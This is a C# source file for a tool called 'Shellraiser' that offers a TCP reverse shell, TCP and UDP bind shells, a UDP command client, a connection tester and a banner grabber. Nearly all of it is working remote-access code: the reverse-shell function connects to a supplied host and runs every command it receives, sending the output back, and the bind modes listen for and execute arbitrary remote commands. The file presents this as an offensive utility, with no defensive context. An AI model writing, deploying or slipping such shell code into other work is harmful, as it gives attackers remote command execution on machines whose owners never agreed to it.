﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Shellraiser
{
    class ShellRunner
    {
        public static void Main(string[] args)
        {
            if (args.Length < 3 || args.Length > 4)
            {
                Console.WriteLine("Invalid number of arguments. Usage: ShellRaiser OPTION IP_ADDRESS PORT [OPTIONAL_ARGS]");
                ShowHelp();
                return;
            }

            string option = args[0];
            string ipAddress = args[1];
            int port = int.Parse(args[2]);
            string[] argArray = null;

            if (args.Length == 4)
            {
                argArray = args[3].Split(' ');
            }
            if (option == "-b")
            {
                TCPBind(ipAddress, port);
            }
            else if (option == "-u")
            {
                UDPBind(ipAddress, port);
            }
            else if (option == "-r")
            {
                Reverse(ipAddress, port);
            }
            else if (option == "-c")
            {
                UDPClient(ipAddress, port);
            }
            else if (option == "-t")
            {
                TestConnect(ipAddress, port);
            }
            else if (option == "-h")
            {
                ShowHelp();
                return;
            }
            else if (option == "-g")
            {
                BannerGrab(ipAddress, port);
            }
            else
            {
                Console.WriteLine("Invalid option. Usage: ");
                ShowHelp();
                return;
            }
        }


        private static void ShowHelp()
        {
            Console.WriteLine("Usage: ShellRunner OPTION IP_ADDRESS PORT");
            Console.WriteLine("OPTIONS:");
            Console.WriteLine("-b: TCP Bind");
            Console.WriteLine("-r: TCP Reverse");
            Console.WriteLine("-u: UDP Bind");
            Console.WriteLine("-c: UDP Client");
            Console.WriteLine("-t: Test Connection");
            Console.WriteLine("-h: Get Help");
            Console.WriteLine("-hh: Get Help with Hellraiser IV: Bloodlines");

        }

        private static void TCPBind(string ipAddress, int port)
        {
            TcpListener listener = new TcpListener(IPAddress.Parse(ipAddress), port);
            listener.Start();
            Console.WriteLine("Listening for incoming connections on " + ipAddress + ":" + port);

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("Received a connection from " + client.Client.RemoteEndPoint);

                using (NetworkStream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        while (true)
                        {
                            string command = reader.ReadLine();
                            if (string.IsNullOrEmpty(command))
                            {
                                reader.Close();
                                stream.Close();
                                client.Close();
                                Console.WriteLine("Connection closed by " + client.Client.RemoteEndPoint);
                                break;
                            }

                            if (string.IsNullOrWhiteSpace(command))
                                continue;

                            string[] split = command.Trim().Split(' ');
                            string filename = split.First();
                            string arg = string.Join(" ", split.Skip(1));

                            try
                            {
                                Process prc = new Process();
                                prc.StartInfo = new ProcessStartInfo();
                                prc.StartInfo.FileName = filename;
                                prc.StartInfo.Arguments = arg;
                                prc.StartInfo.UseShellExecute = false;
                                prc.StartInfo.RedirectStandardOutput = true;
                                prc.Start();
                                prc.StandardOutput.BaseStream.CopyTo(stream);
                                prc.WaitForExit();
                            }
                            catch
                            {
                                string error = "Error running command " + command + "\n";
                                byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                stream.Write(errorBytes, 0, errorBytes.Length);
                            }
                        }
                    }
                }
            }
        }

        // Reverse TCP Shell taking IP and Port
        private static void Reverse(string ipAddress, int port)
        {
            using (TcpClient client = new TcpClient())
            {
                try
                {
                    client.Connect(ipAddress, port);
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            while (true)
                            {
                                string cmd = rdr.ReadLine();

                                if (string.IsNullOrEmpty(cmd))
                                {
                                    rdr.Close();
                                    stream.Close();
                                    client.Close();
                                    return;
                                }

                                if (string.IsNullOrWhiteSpace(cmd))
                                    continue;

                                string[] split = cmd.Trim().Split(' ');
                                string filename = split.First();
                                string arg = string.Join(" ", split.Skip(1));

                                try
                                {
                                    Process prc = new Process();
                                    prc.StartInfo = new ProcessStartInfo();
                                    prc.StartInfo.FileName = filename;
                                    prc.StartInfo.Arguments = arg;
                                    prc.StartInfo.UseShellExecute = false;
                                    prc.StartInfo.RedirectStandardOutput = true;
                                    prc.Start();
                                    prc.StandardOutput.BaseStream.CopyTo(stream);
                                    prc.WaitForExit();
                                }
                                catch
                                {
                                    string error = "Error running command " + cmd + "\n";
                                    byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                    stream.Write(errorBytes, 0, errorBytes.Length);
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error connecting to the server: " + e.Message);
                }
            }
        }

        // UDP Client
        private static void UDPClient(string ipAddress, int port)
        {
            using (UdpClient listener = new UdpClient(port))
            {
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, port);
                string output;
                byte[] bytes;

                using (Socket sock = new Socket(AddressFamily.InterNetwork,
                                                SocketType.Dgram,
                                                ProtocolType.Udp))
                {

                    IPAddress addr = IPAddress.Parse(ipAddress);
                    IPEndPoint addrEP = new IPEndPoint(addr, port);

                    Console.WriteLine("Enter command to send, blank line to quit");
                    while (true)
                    {
                        string command = Console.ReadLine();

                        byte[] buff = Encoding.ASCII.GetBytes(command);
                        try
                        {
                            sock.SendTo(buff, addrEP);

                            if (string.IsNullOrEmpty(command))
                            {
                                sock.Close();
                                listener.Close();
                                return;
                            }

                            if (string.IsNullOrWhiteSpace(command))
                                continue;

                            bytes = listener.Receive(ref remoteEP);
                            output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
                            Console.WriteLine(output);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(" Exception {0}", ex.Message);
                        }
                    }
                }
            }
        }

        private static void UDPBind(string ipAddress, int port)
        {
            IPEndPoint localEP = new IPEndPoint(IPAddress.Parse(ipAddress), port);
            UdpClient udpListener = new UdpClient(localEP);

            Console.WriteLine("Listening for incoming connections on " + ipAddress + ":" + port);

            while (true)
            {
                IPEndPoint remoteEP = null;
                byte[] bytes;
                try
                {
                    bytes = udpListener.Receive(ref remoteEP);
                }
                catch (SocketException e)
                {
                    Console.WriteLine(e.Message);
                    udpListener.Close();
                    return;
                }

                string command = Encoding.ASCII.GetString(bytes);
                if (string.IsNullOrEmpty(command))
                {
                    udpListener.Close();
                    return;
                }
                if (string.IsNullOrWhiteSpace(command))
                    continue;

                string[] split = command.Trim().Split(' ');
                string filename = split.First();
                string arg = string.Join(" ", split.Skip(1));

                try
                {
                    Process prc = new Process();
                    prc.StartInfo = new ProcessStartInfo();
                    prc.StartInfo.FileName = filename;
                    prc.StartInfo.Arguments = arg;
                    prc.StartInfo.UseShellExecute = false;
                    prc.StartInfo.RedirectStandardOutput = true;
                    prc.Start();

                    prc.WaitForExit();
                    string result = prc.StandardOutput.ReadToEnd();
                    Console.WriteLine("Output from " + filename + ": " + result);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error running " + filename + ": " + e.Message);
                }
            }
            udpListener.Close();
        }

        public static void TestConnect(string ipAddress, int port)
        {
            TcpClient tcpClient = new TcpClient();
            UdpClient udpClient = new UdpClient();
            try
            {
                tcpClient.Connect(ipAddress, port);
                Console.WriteLine("TCP connection to {0}:{1} succeeded", ipAddress, port);
            }
            catch (Exception e)
            {
                Console.WriteLine("TCP connection to {0}:{1} failed: {2}", ipAddress, port, e.Message);
            }
            try
            {
                udpClient.Connect(ipAddress, port);
                Console.WriteLine("UDP connection to {0}:{1} succeeded", ipAddress, port);
            }
            catch (Exception e)
            {
                Console.WriteLine("UDP connection to {0}:{1} failed: {2}", ipAddress, port, e.Message);
            }
            finally
            {
                tcpClient.Close();
                udpClient.Close();
            }
        }

        private static void BannerGrab(string ipAddress, int port)
        {
            try
            {
                TcpClient client = new TcpClient(ipAddress, port);
                Console.WriteLine("Connected to " + ipAddress + ":" + port);
                NetworkStream stream = client.GetStream();
                byte[] buffer = new byte[4096];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string banner = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                Console.WriteLine("Banner: " + banner);
                client.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: " + e.Message);
            }
        }

        //
    }
    //
}







